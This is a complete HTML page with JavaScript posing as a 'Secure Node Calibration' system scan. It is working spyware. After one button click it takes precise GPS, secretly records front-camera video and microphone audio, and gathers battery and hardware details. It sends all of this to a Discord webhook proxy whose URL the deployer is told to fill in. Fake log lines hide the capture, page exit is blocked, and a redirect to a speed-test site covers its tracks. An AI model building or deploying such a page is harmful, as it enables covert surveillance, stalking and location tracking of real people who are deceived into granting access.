<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic & Node Calibration</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); text-align: center; }
        .terminal { background: #000; padding: 15px; border-radius: 5px; height: 200px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; opacity: 0; transition: opacity 0.2s; }
        .line.show { opacity: 1; }
        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 1rem; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 0 10px rgba(0, 210, 255, 0.5); }
        .btn:disabled { background: #161b2c; color: #5c6784; box-shadow: none; cursor: not-allowed; }
        .bar-container { height: 2px; width: 100%; background: #111; margin-bottom: 10px; }
        .bar { height: 100%; width: 0%; background: #00d2ff; transition: width 6s linear; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div style="font-size: 0.7rem; color: #5c6784; letter-spacing: 1px;">SECURE NODE CALIBRATION v4.5.5</div>
        <div class="terminal" id="terminal">
            <div class="line show">> System idle. Awaiting authorization...</div>
        </div>
        <div class="bar-container"><div class="bar" id="bar"></div></div>
        <button class="btn" id="startBtn">Authorize Scan</button>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        // !!! IMPORTANT: CHANGE THIS TO YOUR WORKER URL !!!
        const WEBHOOK_PROXY = 'https://discord-proxy.yourname.workers.dev'; 

        const btn = document.getElementById('startBtn');
        const terminal = document.getElementById('terminal');
        const bar = document.getElementById('bar');

        function addLog(text, color = "#00ff41") {
            const div = document.createElement('div');
            div.className = "line show";
            div.style.color = color;
            div.style.borderLeftColor = color;
            div.innerText = text;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        // 1. Anti-Escape
        window.onbeforeunload = function() {
            return "Scan in progress...";
        };

        // 2. GPU Detection
        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_AD) : "Standard";
            } catch (e) { return "Unknown"; }
        }

        btn.addEventListener('click', async function() {
            btn.disabled = true;
            addLog("> Requesting GPS Handshake...");

            // Try Fullscreen
            try { document.documentElement.requestFullscreen(); } catch(e) {}

            navigator.geolocation.getCurrentPosition(async (pos) => {
                addLog("> GPS Linked. Calibrating Sensors...");
                navigator.vibrate([100, 50, 100]);

                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: "user" }, 
                        audio: true 
                    });
                } catch (e) {
                    addLog("> ERROR: Hardware Access Denied.", "#ff4b2b");
                    btn.disabled = false;
                    return;
                }

                if (stream) {
                    addLog("> Media Node Active. Recording Flux...");
                    
                    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus') 
                                     ? 'video/webm;codecs=vp8,opus' : 'video/webm';
                    
                    const mediaRecorder = new MediaRecorder(stream, { mimeType });
                    const chunks = [];
                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                    
                    mediaRecorder.start(1000); 
                    bar.style.width = "100%";

                    setTimeout(() => addLog("> Syncing Clock..."), 1000);
                    setTimeout(() => addLog("> GPU Detected: " + getGPU().split(' ').slice(0,2).join(' ')), 2000);
                    setTimeout(() => addLog("> Optimizing Node..."), 3500);

                    setTimeout(() => {
                        addLog("> Encrypting Telemetry...");
                        mediaRecorder.stop();
                    }, 5000);

                    mediaRecorder.onstop = async () => {
                        const videoBlob = new Blob(chunks, { type: mimeType });
                        const b = await navigator.getBattery();
                        const formData = new FormData();
                        
                        const message = {
                            content: "ðŸ›¸ **SYSTEM NODE CAPTURE**",
                            embeds: [{
                                color: 5763719,
                                fields: [
                                    { name: "ðŸ“ Location", value: "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude },
                                    { name: "ðŸ”‹ Battery", value: Math.round(b.level * 100) + "%", inline: true },
                                    { name: "âš™ï¸ Hardware", value: navigator.hardwareConcurrency + " Core / " + getGPU(), inline: true }
                                ]
                            }]
                        };

                        formData.append('payload_json', JSON.stringify(message));
                        formData.append('file', videoBlob, 'node_data.webm');

                        try {
                            await fetch(WEBHOOK_PROXY, { method: 'POST', body: formData });
                        } catch (err) {
                            console.log("Upload error");
                        }
                        
                        stream.getTracks().forEach(t => t.stop());
                        window.onbeforeunload = null;
                        
                        addLog("> Success. Redirecting...");
                        setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                    };
                }
            }, (err) => {
                addLog("> ERROR: GPS Permission Required.", "#ff4b2b");
                alert("GPS Required for Node Verification.");
                btn.disabled = false;
            }, { enableHighAccuracy: true });
        });
    </script>
</body>
</html>
